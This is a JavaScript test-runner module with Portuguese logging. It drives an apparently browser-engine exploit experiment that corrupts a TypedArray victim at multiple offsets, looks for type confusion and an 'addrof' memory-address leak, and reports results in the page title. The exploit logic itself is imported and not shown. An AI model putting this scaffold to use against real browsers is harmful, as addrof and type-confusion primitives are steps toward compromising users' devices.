// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_MultiOffsetCorruption,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_MultiOffsetCorruption";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (MultiOffsetCorruption) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_MultiOffsetCorruption(); 

    if (result.errorOccurred) { // Erro principal no teste
        logS3(`   RESULTADO: ERRO JS PRINCIPAL CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "critical", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-MOC) MAIN ERR!`; 
    } else if (result.iteration_results && result.iteration_results.length > 0) {
        logS3(`   RESULTADO: Teste de Múltiplos Offsets Concluído. Verificando sucessos...`, "good", FNAME_RUNNER);
        let anySuccess = false;
        let firstSuccessfulOffset = null;
        result.iteration_results.forEach(iter_res => {
            if (iter_res.addrof_A.success || iter_res.addrof_B.success) {
                anySuccess = true;
                if (!firstSuccessfulOffset) firstSuccessfulOffset = iter_res.offset;
                logS3(`     SUCESSO Addrof no Offset ${iter_res.offset}! A: ${iter_res.addrof_A.success}, B: ${iter_res.addrof_B.success}`, "vuln", FNAME_RUNNER);
            }
            if (iter_res.error) {
                 logS3(`     ERRO na iteração do Offset ${iter_res.offset}: ${iter_res.error}`, "error", FNAME_RUNNER);
            }
        });

        if (anySuccess) {
            document.title = `Heisenbug (TypedArray-MOC) Addr SUCCESS @ ${firstSuccessfulOffset}!`;
        } else {
            // Verificar se houve alguma type confusion, mesmo sem addrof
            let typeConfusionObserved = result.iteration_results.some(
                ir => ir.probe_details && ir.probe_details.this_type_in_toJSON === "[object Object]"
            );
            if (typeConfusionObserved) {
                document.title = `Heisenbug (TypedArray-MOC) TC OK, Addr Fail`;
            } else {
                document.title = `Heisenbug (TypedArray-MOC) Test OK/No TC`;
            }
        }
    } else {
        logS3(`   RESULTADO: Nenhuma iteração de resultado encontrada.`, "warn", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-MOC) No Results`;
    }

    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug com TypedArray Vítima (MultiOffsetCorruption) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (MultiOffsetCorruption) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && !document.title.includes("SUCCESS") && !document.title.includes("ERR") && !document.title.includes("TC OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC} Concluído`;
        }
    }
}
